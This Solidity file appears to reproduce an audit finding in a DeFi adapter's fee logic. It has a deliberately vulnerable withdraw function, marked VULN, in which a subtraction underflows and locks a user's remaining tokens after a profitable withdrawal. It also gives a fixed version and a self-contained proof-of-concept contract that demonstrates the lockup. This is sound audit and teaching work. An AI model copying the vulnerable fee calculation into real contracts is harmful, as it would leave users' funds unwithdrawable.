// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Clave ClaggBaseAdapter — _handleFee underflows once withdrawn passes deposited
    (Cantina, December 2024, finding 46277).
    SYNTHETIC, cheatcode-free. The gain line is the audited expression.
    A user who already took profit cannot withdraw the remaining tokens. */

contract MiniToken {
    string public constant symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ClaggBaseAdapter {
    struct UserInfo {
        uint256 deposited;
        uint256 withdrawn;
    }

    struct PoolConfig {
        uint48 performanceFee;
        uint48 nonClaveFee;
    }

    MiniToken public token;
    address public feeRecipient;
    PoolConfig public poolConfig;
    mapping(address => UserInfo) public users;

    constructor(MiniToken _token, address _feeRecipient) {
        token = _token;
        feeRecipient = _feeRecipient;
        poolConfig = PoolConfig({performanceFee: 1000, nonClaveFee: 0});
    }

    function _isClave(address) internal pure returns (bool) {
        return true;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        users[msg.sender].deposited += amount;
    }

    function withdraw(uint256 amount) external {
        UserInfo storage userInfo = users[msg.sender];
        uint48 fee = poolConfig.performanceFee + (_isClave(msg.sender) ? 0 : poolConfig.nonClaveFee);
        uint256 perfFee;
        if (fee > 0 && userInfo.withdrawn + amount > userInfo.deposited) {
            uint256 gain = amount - (userInfo.deposited - userInfo.withdrawn); // @> VULN: deposited - withdrawn underflows once withdrawn exceeds deposited, so the rest of the position cannot be withdrawn
            perfFee = (gain * fee) / 10000;
        }
        userInfo.withdrawn += amount;
        token.transfer(msg.sender, amount - perfFee);
        if (perfFee > 0) token.transfer(feeRecipient, perfFee);
    }
}

contract ClaggBaseAdapterFixed {
    struct UserInfo {
        uint256 deposited;
        uint256 withdrawn;
    }

    MiniToken public token;
    address public feeRecipient;
    uint48 public performanceFee = 1000;
    mapping(address => UserInfo) public users;

    constructor(MiniToken _token, address _feeRecipient) {
        token = _token;
        feeRecipient = _feeRecipient;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        users[msg.sender].deposited += amount;
    }

    function _gain(UserInfo memory userInfo, uint256 amount) internal pure returns (uint256) {
        if (userInfo.withdrawn + amount <= userInfo.deposited) return 0;
        if (userInfo.deposited <= userInfo.withdrawn) return amount;
        return userInfo.withdrawn + amount - userInfo.deposited;
    }

    function withdraw(uint256 amount) external {
        UserInfo storage userInfo = users[msg.sender];
        uint256 gain = _gain(userInfo, amount);
        uint256 perfFee = gain > 0 ? (gain * performanceFee) / 10000 : 0;
        userInfo.withdrawn += amount;
        token.transfer(msg.sender, amount - perfFee);
        if (perfFee > 0) token.transfer(feeRecipient, perfFee);
    }
}

contract Exploit {
    MiniToken public token;
    ClaggBaseAdapter public adapter;
    address public feeSink;

    bool public secondReverted;
    uint256 public stuck;
    uint256 public userBalance;

    constructor() {
        token = new MiniToken();
        feeSink = address(0xFEE);
        adapter = new ClaggBaseAdapter(token, feeSink);
        token.mint(address(this), 100e18);
    }

    function run() external {
        token.approve(address(adapter), 100e18);
        adapter.deposit(100e18);
        token.mint(address(adapter), 20e18);

        adapter.withdraw(110e18);

        try adapter.withdraw(10e18) {
            secondReverted = false;
        } catch {
            secondReverted = true;
        }

        stuck = token.balanceOf(address(adapter));
        userBalance = token.balanceOf(address(this));
        require(secondReverted, "second withdraw did not revert");
        require(stuck == 10e18, "remaining tokens not stuck");
        require(userBalance == 109e18, "first withdraw");
        require(token.balanceOf(feeSink) == 1e18, "first fee");
    }
}
